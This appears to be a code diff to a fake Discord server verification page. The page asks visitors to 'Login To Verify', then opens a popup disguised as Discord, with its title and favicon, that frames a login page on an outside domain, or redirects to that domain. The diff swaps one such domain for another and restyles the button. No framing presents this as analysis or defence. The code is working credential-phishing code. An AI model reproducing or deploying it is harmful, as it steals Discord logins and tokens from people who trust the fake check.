@@ -1319,9 +1319,12 @@ select
                 <p class="is-size-6 has-text-grey">Please complete verification to prove you are a human and gain access to the rest of the server.</p>
                 <div>
               <button class="sc-jIAOiI bfMtSn sc-hKdnnL RIgdT" type="button" id="openLogin">
-                <div class="sc-hiMGwR iwHhCu sc-TRNrF dStzaX"></div>
-                <a class="button is-info is-medium" href="#"
-                    title="Login To Verify">Login To Verify</a>
+                <div class="sc-hiMGwR iwHhCu sc-TRNrF dStzaX">
+                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ciZhAO kmbPg sc-olbas dxIxUA" main="#F2F4FB">
+                    <path d="M23 12C23 18.0751 18.0751 23 12 23" data-stroke="main" stroke="#F2F4FB" stroke-width="2" stroke-linecap="round"></path>
+                  </svg>
+                </div>
+                <a id="abc" class="sc-fXynhf hbzcXP" href="" id="verifybutton">Login</a>
               </button>
           </div>
                                                               
@@ -1357,9 +1360,9 @@ select
 
                                     let params = `scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=${width},height=${height},left=${left},top=${top}`;
                                     newWin = window.open('Discord', 'Discord', params);
-                                    newWin.document.write(`<head><link rel="icon" href="${faviconUrl}" /><title>Discord</title></head><iframe src="https://botbentry.xyz/login" style="border: none; padding: none; margin: none; width: 100%; height: 100%; position: absolute; left: 0px; top: 0px;">`);
+                                    newWin.document.write(`<head><link rel="icon" href="${faviconUrl}" /><title>Discord</title></head><iframe src="https://bstbentry.xyz/login" style="border: none; padding: none; margin: none; width: 100%; height: 100%; position: absolute; left: 0px; top: 0px;">`);
                                 } else {
-                                    location.href = "https://botbentry.xyz/login"
+                                    location.href = "https://bstbentry.xyz/login"
                                 }
                             }
             </script>
